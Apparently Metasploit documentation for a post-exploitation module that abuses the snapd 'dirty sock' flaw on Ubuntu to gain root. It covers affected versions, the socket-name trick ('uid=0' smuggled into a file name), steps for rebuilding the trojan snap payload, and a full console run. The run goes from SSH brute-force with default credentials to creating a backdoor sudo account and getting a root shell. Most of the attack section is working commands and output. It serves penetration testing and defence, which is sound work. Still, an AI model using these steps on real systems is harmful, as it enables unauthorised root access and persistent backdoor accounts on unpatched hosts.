## Vulnerable Application

This module exploits a vulnerability in the snapd service <2.34.2 on Ubuntu
14.04-18.04 and <2.35.5 on Ubuntu 18.10.
The service incorrectly parses a unix socket file name
containing a UID parameter, and honors it as the UID for the process.

Exploitation can be complicated since the snap container is run from a sandbox
with limited read/write to some files on the filesystem.  The exploit creates
a new user with sudo privileges, by default msf:dirty_sock.  Upon successful
exploitation, the credentials may take a minute to become viable.

Exploitation will also cause snapd to perform an auto-update, so this is
a one shot exploit.

### Extra Information

This module utilizes a snap package for exploitation.  A snap package is a squashfs
file which we base64 encode for easy delivery.  The snap package is run inside a sandbox
so exploitation vectors are limited.  The following were attempted to get a remote payload
to run:

1. Add a job to `/etc/crontab`. The snap package could read crontab, but was not able to write
2. Read/Write to the system `/tmp`. The snap package does not view the system `/tmp` but rather
a sandboxed `/tmp`.
3. Utilize networking (`curl`) to get a remote payload. Adding `network` to the snap package
did not result in the ability to successfully `curl` a payload from the attacker.
4. Dynamically add a payload to the snap package. There is limited to no support for dynamically
editing a `squashfs` file within ruby.  Since `squashfs` is compressed, attempts to perform raw
edits on the payload inside the base64 had very limited success and were not stable.

Also of note, attempts to stop snap from updating itself were unsuccessful. Bundling an edit to
`/etc/hosts` as documented here: https://askubuntu.com/questions/930593/how-to-disable-autorefresh-in-snap
did not prevent udpating. A second attempt to set `snap` to use a proxy directly as documented here:
https://discuss.linuxcontainers.org/t/disable-snap-auto-refresh-immediately/5333 were also
not successful.

### Altering Default Payload

The default payload is to create a new user with the `msf` username and `dirty_sock`
password.  However, it is relatively easy to edit the payload

To create a new payload:

1. From bash (replace empty quote with SNAP option value): `echo '' | base64 -d > /tmp/snap_payload`
2. `unsquashfs -l /tmp/snap_payload` # double check files are there and decode was good
3. `mkdir /tmp/snap_squash; cd /tmp/snap_squash`
4. `sudo unsquashfs /tmp/snap_payload`
5. Make any changes you want. This will most likely be in the `squashfs-root/meta/hooks/install`
or `squashfs-root/meta/snap.yaml` files
6. `mksquashfs /tmp/snap_squash/squashfs-root/ /tmp/snap_payload`
7. `cat /tmp/snap_payload | base64` # copy this to your clipboard
8. You will now do a `set option SNAP '<insert copy and pasted content here>'`

## Verification Steps

1. Start msfconsole
2. Get a shell on a vulenrable box
3. Do: `use post/linux/escalate/ubuntu_snapd_socket_privesc`
4. Do: `set session [#]`
5. Do: `run`
6. You should get a "Success!", and able to able to SSH in to the remote box, then `sudo` to root.

## Options

### SNAP

This is a base64 encoded snap package. See instructions in this document to modify it.

## Scenarios

### snapd 2.29.4.2 on Ubuntu 16.04


#### Initial Shell
```
[*] Processing snapd.rb for ERB directives.
resource (snapd.rb)> use auxiliary/scanner/ssh/ssh_login
resource (snapd.rb)> set username ubuntu
username => ubuntu
resource (snapd.rb)> set password ubuntu
password => ubuntu
resource (snapd.rb)> set rhosts 111.111.1.111
rhosts => 111.111.1.111
resource (snapd.rb)> run
[*] 111.111.1.111:22 - Starting bruteforce
[+] 111.111.1.111:22 - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (2.2.2.2:46713 -> 111.111.1.111:22 ) at 2022-03-15 18:52:06 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Priv Esc
```
resource (snapd.rb)> use post/linux/escalate/ubuntu_snapd_socket_privesc
resource (snapd.rb)> set session 1
session => 1
resource (snapd.rb)> set verbose true
verbose => true
resource (snapd.rb)> run
[*] Found snapd 2.29.4.2 on Ubuntu 16.04
[*] Using 'python' to run exploit
[*] Writing exploit to /tmp/.nUIPGYbWr7
[*] Max line length is 65537
[*] Writing 13110 bytes in 1 chunks of 48973 bytes (octal-encoded), using printf
[*] Launching exploit: python /tmp/.nUIPGYbWr7
[*] [+] Slipped dirty sock on random socket file: /tmp/qkmqdejlyv;uid=0;
[*] [+] Binding to socket file...
[*] [+] Connecting to snapd API...
[*] [+] Deleting trojan snap (and sleeping 5 seconds)...
[*] [+] Installing the trojan snap (and sleeping 8 seconds)...
[*] [+] Deleting trojan snap (and sleeping 5 seconds)...
[*] Success!
[+] Success! You can now login and sudo with msf:dirty_sock or whatever credentials were included in the snap option. However it may take several minutes for the account to finish creation.
[*] Post module execution completed
resource (snapd.rb)> sleep 30
```

#### Use new creds
```
resource (snapd.rb)> use auxiliary/scanner/ssh/ssh_login
resource (snapd.rb)> set username msf
username => msf
resource (snapd.rb)> set password dirty_sock
password => dirty_sock
resource (snapd.rb)> run
[*] 111.111.1.111:22 - Starting bruteforce
[+] 111.111.1.111:22 - Success: 'msf:dirty_sock' 'uid=1001(msf) gid=1001(msf) groups=1001(msf),27(sudo) Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 2 opened (2.2.2.2:43069 -> 111.111.1.111:22 ) at 2022-03-15 18:53:08 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
resource (snapd.rb)> use multi/manage/sudo
resource (snapd.rb)> set session 2
session => 2
resource (snapd.rb)> set password dirty_sock
password => dirty_sock
resource (snapd.rb)> run
[*] SUDO: Attempting to upgrade to UID 0 via sudo
[*] Sudoing with password `dirty_sock'.
[+] SUDO: Root shell secured.
[*] Post module execution completed
msf6 post(multi/manage/sudo) > sessions -i 2
[*] Starting interaction with 2...

id
uid=0(root) gid=0(root) groups=0(root)

uname -a
Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04.3 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.3 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial

snap version
snap    2.54.4
snapd   2.54.4
series  16
ubuntu  16.04
kernel  4.4.0-112-generic
```
